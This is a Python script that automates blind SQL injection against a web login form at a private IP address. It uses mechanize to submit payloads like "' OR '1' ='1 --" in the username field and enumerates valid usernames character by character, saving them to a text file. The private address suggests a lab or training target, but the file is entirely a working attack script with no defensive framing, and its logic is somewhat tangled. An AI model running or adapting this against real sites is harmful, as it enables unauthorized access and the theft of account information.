import mechanize
import string
import requests


POSSIBLE_CHARS = 'abcdefghijklmnopqrstuvwxyz0123456789'
possibleChars = list(POSSIBLE_CHARS)
URL = 'http://10.14.4.14/users/login.php'
userlist =[]


def part_user(user):
#use mechanize to access the website through browser
    br = mechanize.Browser()
    br.open("http://10.14.4.14/users/login.php")
    br.form=list(br.forms())[1]
    request = user + "%' OR '1' ='1 --"
#test SQL INJECTION CODE in the form username field
    br.form['username'] = request
    br.submit()
#try open home page as user
    br.open("http://10.14.4.14/users/home.php")
    newurl = "http://10.14.4.14/users/home.php"
    url = br.geturl()
#if successfully opened home page as user (we have logged in)
    if newurl==url: 
	br.open("http://10.14.4.14/users/logout.php")
    	return True
    return False

def userless(user,nextChar,i):#method to check if the completed username has more usernames with the same starting point but minus the last letter and starting with a higher character
	usertmp = user
	while i<len(possibleChars):
		if (part_user(user + possibleChars[i]) == True):
			user += possibleChars[i]
			i=0
		else:i = i + 1;
	if user != usertmp:
		username(user[:-1],possibleChars[0],(i-1))
	else:
		userless(user[:-1],possibleChars[i],(possibleChars.index(user[(len(user)-1):])+1))


def userlonger(user,nextChar,i): #method to check if the completed username has more usernames with the same starting point
	usertmp = user
	while i<len(possibleChars):
		if (part_user(user + possibleChars[i]) == True):
			user += possibleChars[i]
			i = 0;
		else:
			i = i + 1;
	if user != usertmp:
		username(user[:-1],possibleChars[0],(i-1))	
	else:
		if i<len(possibleChars):
			userless(user[:-1],possibleChars[i],(possibleChars.index(user[(len(user)-1):])+1))


def username(user,nextChar,i):	
	x =0
	while i<len(possibleChars):
		c=possibleChars[i]
		br = mechanize.Browser()
#send to part_pass to test if part of the username is correct
		if (part_user(user + possibleChars[i]) == True):
			i = 0;
			user += c
			br.open("http://10.14.4.14/users/login.php")
			br.form=list(br.forms())[1]
			request = user + "' OR '1' ='1 --"
			br.form['username'] = request
			br.submit()
			br.open("http://10.14.4.14/users/home.php")
			newurl = "http://10.14.4.14/users/home.php"
			url = br.geturl()
#test to see if the username has been completed
			if newurl==url: 
				br.open("http://10.14.4.14/users/logout.php")	
				if user not in userlist:
					userlist.append(user)
					print user
#write out the users username
					file.write('Username =' + user +'\n')
					userlonger(user,possibleChars[0],0)
				else:	
					userlonger(user,possibleChars[0],0)					
		else:
			if i==len(possibleChars):
				break
			i=i+1
			#print(i)	
			if i>=len(possibleChars):
				print(i)
				print(len(user))			
				if len(user)==0 and i == 36:
					print("got here-not brea")					
					break
				else:
					username(user[:-1],possibleChars[0],(possibleChars.index(user[(len(user)-1):])+1))
	return userlist

file= open("Usernames.txt","w+")

i=0
username(possibleChars[0],possibleChars[i],0)
	
file.close()	

